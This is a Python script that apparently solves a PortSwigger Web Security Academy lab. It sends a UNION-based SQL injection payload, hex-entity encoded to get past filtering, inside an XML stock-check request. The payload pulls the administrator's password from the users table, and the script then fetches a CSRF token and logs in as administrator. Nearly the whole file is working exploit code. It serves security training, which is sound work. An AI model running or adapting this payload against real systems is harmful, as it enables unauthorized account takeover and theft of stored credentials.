import requests
from typing import Optional, Any

session=requests.Session()

BASE_URL="https://0ac2007d03171b7e83d77dec008e005f.web-security-academy.net"
TARGET_URL = BASE_URL+"/product/stock"
LOGIN_URL = BASE_URL+"/login"

def post_request(url:str, data:dict[str, Any], timeout:int =10) -> Optional[requests.Response]:
    try:
        return session.post(url, data=data, timeout=timeout)
    except requests.RequestException as e:
        print(f"error:{e}")
        return None
def to_hex_entities(s: str) -> str:
    return "".join([f"&#x{ord(c):X};" for c in s])

def find_pw(text:str)->str:
    import re
    match = re.search(r"pw:([a-z0-9]+)", text)
    if match:
        return match.group(1)

def find_csrf()->str:
    response = session.get(LOGIN_URL,timeout=10)
    from bs4 import BeautifulSoup
    soup = BeautifulSoup(response.text,"html.parser")
    csrf_input = soup.find("input",{"name":"csrf"})
    return csrf_input.get("value")

def login(password:str):

    data={
        "csrf":find_csrf(),
        "username":"administrator",
        "password":password
    }

    response = post_request(LOGIN_URL,data)
    if "Your username is: administrator" in response.text:
        print("login success")

def main():
    payload = "1 union select 'pw:'||password from users where username='administrator'"
    encoded_payload = to_hex_entities(payload)
    data="<?xml version=\"1.0\" encoding=\"UTF-8\"?><stockCheck><productId>1</productId><storeId>"+encoded_payload+"</storeId></stockCheck>"
    response = post_request(TARGET_URL,data)
    pw = find_pw(response.text)
    print(pw)

    login(pw)


if __name__ == "__main__":
    main()